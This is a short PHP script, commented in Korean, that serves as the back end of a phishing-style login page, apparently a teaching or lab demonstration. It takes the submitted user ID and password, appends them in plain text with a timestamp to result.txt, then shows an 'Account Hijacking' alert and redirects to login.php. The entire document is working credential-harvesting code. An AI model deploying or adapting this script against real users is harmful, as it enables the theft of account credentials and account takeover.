<?php
  # result.txt에 파일을 읽기/쓰기한다. a:result.txt 파일이 존재할 경우 파일 끝에 추가/ 없을 경우 생성
  $handle = fopen("result.txt","a");
  # data 함수에 Y:연 m:월 d:일 H:시 i:분 s:초 추가
  $ymd = date("Y-m-d H:i:s", time());
  # result라는 변수에 출력될 값을 지정 $_POST(ID매개변수) $_POST(PASSWORD매개변수)
  $result = "+++++++++++Login Result+++++++++++++\r\n++      $ymd       ++\r\n++      ID => $_POST[userid]                 ++\r\n++      Password => $_POST[password]           ++\r\n++++++++++++++++++++++++++++++++++++\r\n";
  # fwrite(&파일을 포인팅하고 있는 핸들러변수, $result.txt에 쓸 내용)
  fwrite($handle, $result);
  # result.txt 파일 종료
  fclose($handle);
?>
  <!--로그인 시도 후 팝업창 설정-->
<script>
  window.alert('Account Hijacking!!!!.');
  location.href = 'login.php';
</script>